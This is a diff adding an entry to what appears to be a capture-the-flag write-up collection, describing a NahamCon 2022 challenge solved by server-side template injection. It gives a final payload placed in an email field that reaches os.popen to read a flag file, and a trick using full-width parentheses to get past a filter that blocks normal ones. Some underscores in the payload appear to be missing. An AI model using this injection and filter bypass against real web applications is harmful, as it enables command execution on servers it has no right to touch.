@@ -71,4 +71,7 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close
 ```
-
+- ## Nahamcon 2022(Deafcon):
+  In this challenge, parenthesis were blacklistyed which means that any python command could not be executed. The way around this was to use full width parenthesis intead of half width which would serve the purpose and all bypass the filter.
+ Final payload:```"{{ self._TemplateReferencecontext.cycler.init.globals__.os.popen（'cat flag.txt'）.read（）}}"@aaa.com```
+This payload was inserted into the email field and flag was obtained
